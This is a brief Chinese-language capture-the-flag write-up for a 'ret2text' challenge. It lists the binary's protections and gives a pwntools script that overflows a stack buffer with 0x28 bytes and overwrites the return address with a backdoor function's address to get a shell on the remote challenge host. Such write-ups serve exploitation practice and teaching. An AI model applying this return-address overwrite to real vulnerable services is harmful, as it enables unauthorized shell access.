# W1 ret2text

## 文件分析

下载`ret2text`, NX on, PIE off, Canary off, RELRO full  
ghidra分析为64位程序

## 解题思路

`backdoor`函数直接打开sh了，打就完了

## EXPLOIT

```python
from pwn import *
sh = remote("node4.buuoj.cn", 29533)
sh.sendline(b'0'*0x28 + p64(0x004011fb)) # addr of backdoor
sh.interactive()
```

Done.
